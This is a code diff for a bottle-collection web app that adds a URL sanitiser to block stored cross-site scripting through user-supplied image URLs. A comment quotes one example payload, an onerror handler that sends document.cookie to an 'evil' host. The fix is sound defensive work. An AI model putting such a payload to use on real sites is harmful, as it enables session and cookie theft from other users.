@@ -3842,7 +3842,7 @@ function renderBottleMetaLine(bottle) {
 }
 
 function renderCollectionBottleImage(bottle) {
-  const image = bottle.imageUrl || getCuratedBottleImage(bottle);
+  const image = safeImageUrl(bottle.imageUrl) || safeImageUrl(getCuratedBottleImage(bottle));
   if (image) {
     return `<img class="collection-bottle-image" src="${image}" alt="${escapeHtml(bottle.name)} bottle" />`;
   }
@@ -8702,9 +8702,30 @@ function renderBottleDetailView() {
   });
 }
 
+// Only allow image URLs we produce or trust, and reject anything containing
+// characters that could terminate an HTML attribute or inject markup. Bottle
+// data is rendered cross-user (a friend's cabinet renders your bottles), so a
+// malicious imageUrl like `x" onerror="fetch(evil+document.cookie)` would be
+// stored XSS if interpolated raw into src="...". Returns "" for anything
+// unsafe so callers fall back to the placeholder. The value it returns is a
+// raw (un-escaped) URL with no attribute-breaking characters, so it is safe in
+// both `src="${...}"` markup and `img.src = ...` property assignments.
+const SAFE_IMAGE_DATA = /^data:image\/(?:jpeg|jpg|png|gif|webp);/i;
+function safeImageUrl(url) {
+  const value = String(url == null ? "" : url).trim();
+  if (!value) return "";
+  if (SAFE_IMAGE_DATA.test(value)) return value; // our own downscaled JPEGs + the placeholder GIF
+  if (/[<>"'`\\\s]/.test(value)) return ""; // block attribute breakout / markup injection
+  const lower = value.toLowerCase();
+  if (lower.startsWith("https://") || lower.startsWith("blob:")) return value;
+  if (/^(?:\.?\/|assets\/|public\/)/.test(value)) return value; // bundled relative paths
+  return ""; // reject http:, javascript:, data:image/svg+xml, and anything else
+}
+
 function bottleImage(bottle) {
-  if (bottle.imageUrl) return bottle.imageUrl;
-  const curatedImage = getCuratedBottleImage(bottle);
+  const own = safeImageUrl(bottle.imageUrl);
+  if (own) return own;
+  const curatedImage = safeImageUrl(getCuratedBottleImage(bottle));
   if (curatedImage) return curatedImage;
   return "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///ywAAAAAAQABAAACAUwAOw==";
 }
@@ -8712,7 +8733,7 @@ function bottleImage(bottle) {
 // A real photo when we have one, otherwise a clean initial tile instead of a blank box.
 function bottleThumb(bottle, extraClass = "") {
   const cls = `catalog-thumb${extraClass ? ` ${extraClass}` : ""}`;
-  const image = bottle.imageUrl || getCuratedBottleImage(bottle);
+  const image = safeImageUrl(bottle.imageUrl) || safeImageUrl(getCuratedBottleImage(bottle));
   if (image) {
     return `<img class="${cls}" src="${image}" alt="${escapeHtml(bottle.name)} bottle" />`;
   }
